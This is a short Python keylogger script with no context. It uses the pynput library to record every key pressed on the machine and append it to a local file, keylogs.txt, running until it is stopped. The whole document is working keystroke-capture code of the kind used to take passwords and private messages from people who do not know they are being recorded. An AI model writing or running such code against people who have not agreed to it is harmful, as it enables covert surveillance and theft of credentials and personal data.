import pynput.keyboard

def log_keys(key):
    with open("keylogs.txt", "a") as keyboard_log:
        try:
            keyboard_log.write(key.char)
        except AttributeError:
            keyboard_log.write(str(key))

keyboard_listener = pynput.keyboard.Listener(on_press=log_keys)

with keyboard_listener:
    keyboard_listener.join()
